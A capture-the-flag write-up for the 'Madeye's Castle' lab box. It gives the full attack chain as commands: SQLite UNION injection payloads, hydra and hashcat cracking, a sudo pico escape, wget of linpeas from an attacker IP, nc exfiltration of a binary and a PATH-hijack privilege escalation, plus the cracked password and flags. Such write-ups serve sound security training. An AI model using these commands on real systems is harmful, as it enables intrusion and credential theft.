# Madeye's Castle - Medium

```shell
sudo vim /etc/hosts
#add castle.thm

nmap -T4 -p- -A -Pn -v castle.thm

smbclient -L \\\\castle.thm
#list all shares

smbclient \\\\castle.thm\\sambashare
#access sambashare

mget *
#get all files
#go through files

cat spellnames.txt

cat .notes.txt

sudo vim /etc/hosts
#add hogwartz-castle.thm

#bruteforce login
hydra -l harry -P /usr/share/wordlists/rockyou.txt hogwartz-castle.thm http-post-form "/login:user=harry&password=^PASS^:Incorrect Username or Password"
#does not work

#check for injection
#intercept and save login request with Burp Suite
sqlmap -r hogwartz.req --level 5

#manual injection gives us response
#save this request
sqlmap -r hogwartz2.req --level 5 --risk 3 --dump-all --threads 10
#detects SQLite

#attempt manual SQLi with burp suite
#use SQLite payload and get hashes

#crack the hash
#use best64 rule
hashcat -a 0 -m 1700 harryhash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule

#login using creds

ssh harry@castle.thm

cat user1.txt

sudo -l
#we can run /usr/bin/pico as hermonine

#GTFObins exploit for 'pico'
sudo -u hermonine /usr/bin/pico
#Ctrl+R, Ctrl+X
reset; sh 1>&0 2>&0

#now we have shell as hermonine
bash

cd /tmp

#in attacker machine
python3 -m http.server

#in victim session
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

ls -la /srv/time-turner

#unknown SUID binary
ls -la /srv/time-turner/swagger

#transfer file from victim to attacker
#in attacker machine
nc -nvlp 4444 > swagger

#in victim machine
nc 10.14.31.212 4444 -w 3 < swagger

#we can now analyse 'swagger' in attacker machine
#using Ghidra, view impressive() function

#in attacker machine
chmod +x swagger

#rand() is vulnerable
for x in {1..3}; do echo 0 | ./swagger; done
#same number is chosen everytime

#we can exploit this
echo 0 | ./swagger | grep -oE '[0-9]+' | ./swagger
#this prints system architecture

#in victim machine
cd /tmp

export PATH=/tmp:$PATH

echo $PATH

echo 'cat /root/root.txt' > /tmp/uname

chmod +x /tmp/uname

#run swagger binary to print root flag
echo 0 | /srv/time-turner/swagger | grep -oE '[0-9]+' | /srv/time-turner/swagger
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29
  * 139 - netbios-ssn - Samba smbd 3.X - 4.X
  * 445 - netbios-ssn - Samba smbd 4.7.6-Ubuntu

* We can start by enumerating the SMB shares using ```smbclient```.

* We can access one share out of all the three listed - 'sambashare' - the comment shows that these are "Harry's important files".

* This share includes two files - 'spellnames.txt' and '.notes.txt' - we can go through these.

* The note shows that we can use the 'rockyou' wordlist later; it also mentions a 'text editor' - we can keep these clues in mind for now.

* Now, checking the webpage on port 80 shows that it is the default landing page for Apache.

* However, when viewing its source code, we get a virtual host <hogwartz-castle.thm>

* We can add this to our /etc/hosts file and visit this page.

* This new page titled 'Welcome to Hogwartz' is a login portal.

* We can attempt to bruteforce login as 'harry' using ```hydra``` and we will use ```rockyou.txt``` as our wordlist.

* While the bruteforce process runs in the background, we can attempt to check for SQL injection.

* We can intercept the login request using Burp Suite, and save it to a file, and use it with ```sqlmap```.

* We can also attempt manual SQLi; using the payload ```' or 1=1--``` leads us to a JSON response:

```"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"```

* Now we have two potential usernames - Lucas Washington and administrator.

* We can continue manual SQL injection.

* We can also run ```sqlmap``` in background.

* We can use these payloads to determine the number of columns:

```sql
admin' UNION SELECT NULL--
#error

admin' UNION SELECT NULL,NULL--
#error

admin' UNION SELECT NULL,NULL,NULL--
#error

admin' UNION SELECT NULL,NULL,NULL,NULL--
#error
```

* We know that there are 4 columns, we can now attempt to find data type for the columns:

```sql
admin' UNION SELECT 'a','a','a','a'--
#confirms that all four columns are of string type
```

* Meanwhile, ```sqlmap``` shows that the back-end DBMS is ```SQLite```; we can use [payloads specific to SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) then.

* Payload to print version:

```sql
admin' UNION SELECT sqlite_version(),'a','a','a'--
#we get version 3.22.0
```

* Payload to print table name:

```sql
admin' UNION SELECT group_concat(tbl_name),'a','a','a' FROM sqlite_master--
#gives table name 'users'
```

* Payload to get column names from table 'users':

```sql
admin' UNION SELECT sql,'a','a','a' FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='users'--
#gives columns - name, password, admin, notes
```

* Payload to get data from all columns:

```sql
admin' UNION SELECT group_concat(name||'~'||password||'~'||admin||'~'||notes),'a','a','a' FROM users--
```

* As this data can be tough to view in ```Burp Suite```, we can use this payload in browser and view it in JSON form.

* As we have used the tilde sign (~) as separators, we can see that there are too many entries.

* However, for one entry, the 'note' column has a different entry:

```My linux username is my first name, and password uses best64```

* This entry is for 'Harry Turner'; and 'best64' refers to a ```hashcat``` rule.

* So, we can copy the hash and attempt to crack it using ```hashcat``` - it is a SHA512 hash so we will have to use the corresponding mode.

* Cracking the hash gives us the password "wingardiumleviosa123"; now, we can login.

* Logging in, we get the message:

```Even though Ron said password reuse is bad, I don't really care```

* This means we can attempt to login as 'harry' via SSH using the same password.

* SSH login works and we get user flag 1.

* ```sudo -l``` shows that we can run ```pico``` program as user 'hermonine'.

* GTFObins has a ```sudo``` exploit for ```pico```, so we can use that to get shell as 'hermonine' and get user flag 2.

* For privesc, we can now use ```linpeas```.

* This identifies an unknown SUID binary ```/srv/time-turner/swagger```.

* We can transfer this 'swagger' program from victim to attacker machine using ```nc```, and analyse it using ```Ghidra```.

* In ```Ghidra```, we can load the 'swagger' program and view the 'main()' function - this uses 'rand()' to generate random numbers and 'impressive()' function to compare the numbers.

* Now, this 'impressive()' function calls ```uname -p``` to print the system architecture as root.

* Furthermore, it uses the relative path, not absolute - so we can use path hijack technique to abuse ```uname```.

* We can confirm this by using ```strings```, it works.

* Now, the 'rand()' function is vulnerable, this can be proved by running the program multiple times in loop - it always prints same number.

* Thus, we can exploit this by feeding a wrong input first, followed by using ```grep``` to get the correct number, and run the program again - this time feeding the correct number as input.

* This works on attacker machine, so we can abuse ```uname``` in victim machine to read the root flag.

* Using path hijacking technique, we can create 'uname' program in /tmp which prints root flag.

* Now, if we run the 'swagger' program in the same manner as before, it prints the root flag.

```markdown
1. User1.txt - RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}

2. User2.txt - RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}

3. Root.txt - RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```
